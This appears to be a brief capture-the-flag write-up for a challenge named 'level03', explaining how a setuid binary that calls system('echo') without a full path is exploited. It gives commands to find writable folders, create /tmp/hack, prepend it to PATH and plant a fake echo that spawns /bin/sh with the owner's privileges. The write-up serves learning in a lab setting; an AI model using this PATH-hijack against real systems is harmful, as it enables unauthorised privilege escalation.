#We found 3 files in it and a binary named level03 with the owner flag03
./level03 -> "Exploit me"
#Let's analyse the binary, using ltrace or gdb (disassemble main) we can see that the binary use
#a system call. With ltrace we can see there is a call to the system echo
#Our path for system call : PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
#Let's find a folder where we can write and execute to set our Path there
find / -type d -writable 2>&1 | grep -v "Permission denied" #getting list of folder where we can write
#create a new folder there
mkdir /tmp/hack
#setting our new folder as the first path
PATH=/tmp/hack:$PATH
#create an echo binary that will launch execl("/bin/sh", "sh", NULL)
#in the hack folder that will be executed by the system(echo) of the binary.
#now execute the binary, you will now have access of a shell with the privilege of the owner of the binary.
